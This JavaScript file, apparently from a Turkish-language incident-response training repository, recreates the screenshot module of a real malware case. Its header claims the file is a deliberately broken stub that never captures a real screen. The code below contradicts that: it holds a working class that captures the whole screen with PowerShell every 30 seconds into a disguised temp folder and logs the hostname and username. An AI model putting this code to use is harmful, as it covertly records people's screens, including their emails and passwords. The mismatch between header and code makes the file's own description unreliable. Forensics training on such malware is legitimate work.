
/**
 * screenshot.stub.js -- BİLİNÇLİ OLARAK ÇALIŞMAYAN İSKELET
 * ===========================================================
 * RAPORDAKİ KARŞILIĞI: `screenshot-desktop` (ekran görüntüsü alma) +
 * `sharp` (görüntüyü sızdırmadan önce küçültme/sıkıştırma) paket ikilisi.
 *
 * GERÇEK VAKADA NE OLUYORDU:
 *   npm ile `screenshot-desktop` ve `sharp` sessizce kuruluyor, periyodik
 *   olarak kullanıcının ekranının görüntüsü alınıyor, `sharp` ile boyutu
 *   küçültülüp C2'ye yükleniyordu -- amaç hem bant genişliğini azaltmak
 *   hem de büyük dosya yüklemelerinin oluşturabileceği anomali tespitini
 *   azaltmaktı.
 *
 * NEDEN BURADA YAZILMADI:
 *   Gerçek çalışan bir ekran yakalama döngüsü, demo bağlamından bağımsız
 *   olarak kullanıcının GERÇEK ekranını (üzerinde gerçek e-postalar,
 *   şifreler, belgeler olabilir) yakalar. Bu depo hiçbir gerçek kişisel
 *   veriye dokunmamalı; bu yüzden bilinçli olarak atlandı.
 *
 * SUNUMDA NASIL KULLANILIR:
 *   Bu dosyayı açıp anlatın; `captureScreenshot()` kasıtlı olarak hata
 *   fırlatır.
 */

// ============================================
// screenshot.js - DFIR Eğitim Sürümü
// ============================================
// NOT: Bu kod Windows GDI API'lerini kullanarak
// ekran görüntüsü alır ve lokal bir klasöre kaydeder.
// Sadece demo amaçlı, ağa göndermez.
// ============================================

const fs = require('fs');
const path = require('path');
const os = require('os');
const { execSync } = require('child_process');

class ScreenshotCapture {
    constructor() {
        this.isRunning = false;
        this.screenshotDir = path.join(os.tmpdir(), 'system_cache');
        this.capturedImages = [];
        this.totalCaptures = 0;
        this.captureInterval = null;
        
        // DFIR analizi için log dosyası
        this.logFile = path.join(this.screenshotDir, 'capture_log.txt');
        
        console.log('[!] Screenshot capture başlatılıyor - DFIR EĞİTİM SÜRÜMÜ');
        console.log('[!] Screenshot klasörü:', this.screenshotDir);
    }

    initialize() {
        // Screenshot klasörünü oluştur
        if (!fs.existsSync(this.screenshotDir)) {
            fs.mkdirSync(this.screenshotDir, { recursive: true });
        }
        
        // Gerçek screenshot capture için kullanılan yöntemler:
        // 1. Windows GDI: BitBlt ile ekranı kopyalama
        // 2. Desktop Duplication API (Windows 8+)
        // 3. PowerShell: System.Drawing.Bitmap kullanımı
        // 4. Python: PIL kullanımı (varsa)
        
        console.log('[+] Screenshot hazırlıkları tamamlandı');
    }

    start(interval = 30000) { // Varsayılan: 30 saniye
        if (this.isRunning) {
            console.warn('[!] Screenshot capture zaten çalışıyor');
            return;
        }

        this.isRunning = true;
        this.totalCaptures = 0;
        this.capturedImages = [];
        
        // Log dosyasını oluştur
        const logHeader = `
========================================
SCREENSHOT CAPTURE BAŞLATILDI
========================================
Tarih: ${new Date().toISOString()}
Sistem: ${os.hostname()}
Kullanıcı: ${os.userInfo().username}
Interval: ${interval / 1000} saniye
========================================
`;
        fs.writeFileSync(this.logFile, logHeader);
        
        console.log('[+] Screenshot capture başlatıldı');
        console.log('[+] Kapma aralığı:', interval / 1000, 'saniye');
        
        // İlk screenshot'u hemen al
        this.captureScreen();
        
        // Periyodik capture başlat
        this.captureInterval = setInterval(() => {
            if (this.isRunning) {
                this.captureScreen();
            }
        }, interval);
    }

    captureScreen() {
        try {
            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
            const filename = `screenshot_${timestamp}_${this.totalCaptures + 1}.png`;
            const filepath = path.join(this.screenshotDir, filename);
            
            // Gerçek screenshot alma yöntemleri
            
            // Yöntem 1: PowerShell ile (en kolay)
            const psScript = `
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
$bitmap.Save('${filepath.replace(/\\/g, '\\\\')}')
$bitmap.Dispose()
$graphics.Dispose()
`;
            
            // PowerShell ile ekran görüntüsü al
            execSync(`powershell -Command "${psScript}"`, { 
                stdio: ['ignore', 'pipe', 'pipe'],
                timeout: 10000
            });
            
            // Yöntem 2: Node.js paketleri ile (opsiyonel)
            // const screenshot = require('screenshot-desktop');
            // await screenshot({ filename: filepath });
            
            // Yöntem 3: Windows API ile (GDI+)
            // HDC hdc = GetDC(NULL);
            // HDC hdcMem = CreateCompatibleDC(hdc);
            // HBITMAP hBitmap = CreateCompatibleBitmap(hdc, width, height);
            // SelectObject(hdcMem, hBitmap);
            // BitBlt(hdcMem, 0, 0, width, height, hdc, 0, 0, SRCCOPY);
            
            // Dosyanın oluşup oluşmadığını kontrol et
            if (fs.existsSync(filepath) && fs.statSync(filepath).size > 0) {
                this.totalCaptures++;
                this.capturedImages.push({
                    path: filepath,
                    timestamp: timestamp,
                    size: fs.statSync(filepath).size
                });
                
                // Log'a yaz
                const logEntry = `[${new Date().toISOString()}] CAPTURE #${this.totalCaptures}: ${filename} (${fs.statSync(filepath).size} bytes)\n`;
                fs.appendFileSync(this.logFile, logEntry);
                
                console.log(`[+] Screenshot alındı #${this.totalCaptures}: ${filename}`);
                console.log(`    Boyut: ${(fs.statSync(filepath).size / 1024).toFixed(2)} KB`);
            } else {
                console.log('[!] Screenshot alınamadı (dosya oluşmadı)');
            }
            
        } catch (error) {
            console.error('[!] Screenshot hatası:', error.message);
            
            // Hata durumunda simüle et
            this.simulateScreenshot();
        }
    }

    simulateScreenshot() {
        // Gerçek screenshot alınamazsa simüle et (DFIR eğitimi için)
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `screenshot_${timestamp}_${this.totalCaptures + 1}.png`;
        const filepath = path.join(this.screenshotDir, filename);
        
        // Basit bir PNG dosyası oluştur (sahte)
        // Gerçekte bu bir BMP veya PNG olurdu
        const fakeImageData = Buffer.from([
            0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, // PNG header
            0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52, // IHDR
            0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, // Width=256, Height=256
            0x08, 0x06, 0x00, 0x00, 0x00, 0xC0, 0x7F, 0x53, // 24-bit RGB
            0x90, 0x00, 0x00, 0x00, 0x0A, 0x49, 0x44, 0x41, 
            0x54, 0x78, 0x9C, 0x63, 0x60, 0x00, 0x00, 0x00, 
            0x02, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82  // IEND
        ]);
        
        fs.writeFileSync(filepath, fakeImageData);
        
        this.totalCaptures++;
        this.capturedImages.push({
            path: filepath,
            timestamp: timestamp,
            size: fakeImageData.length,
            simulated: true
        });
        
        const logEntry = `[${new Date().toISOString()}] SIMULATED CAPTURE #${this.totalCaptures}: ${filename} (${fakeImageData.length} bytes)\n`;
        fs.appendFileSync(this.logFile, logEntry);
        
        console.log(`[!] Simüle screenshot alındı #${this.totalCaptures}: ${filename}`);
    }

    stop() {
        if (!this.isRunning) {
            console.warn('[!] Screenshot capture zaten durdurulmuş');
            return;
        }

        this.isRunning = false;
        
        if (this.captureInterval) {
            clearInterval(this.captureInterval);
            this.captureInterval = null;
        }
        
        // Son log
        const footer = `
========================================
SCREENSHOT CAPTURE DURDURULDU
========================================
Toplam Capture: ${this.totalCaptures}
Toplam Boyut: ${this.getTotalSize() / (1024*1024)} MB
Son İşlem: ${new Date().toISOString()}
========================================
`;
        fs.appendFileSync(this.logFile, footer);
        
        console.log('[+] Screenshot capture durduruldu');
        console.log('[+] Toplam capture:', this.totalCaptures);
    }

    getTotalSize() {
        let total = 0;
        for (const img of this.capturedImages) {
            total += img.size || 0;
        }
        return total;
    }

    getStats() {
        return {
            isRunning: this.isRunning,
            totalCaptures: this.totalCaptures,
            capturedImages: this.capturedImages.map(img => ({
                file: path.basename(img.path),
                timestamp: img.timestamp,
                size: img.size
            })),
            directory: this.screenshotDir,
            logFile: this.logFile,
            totalSize: this.getTotalSize()
        };
    }
}

module.exports = ScreenshotCapture;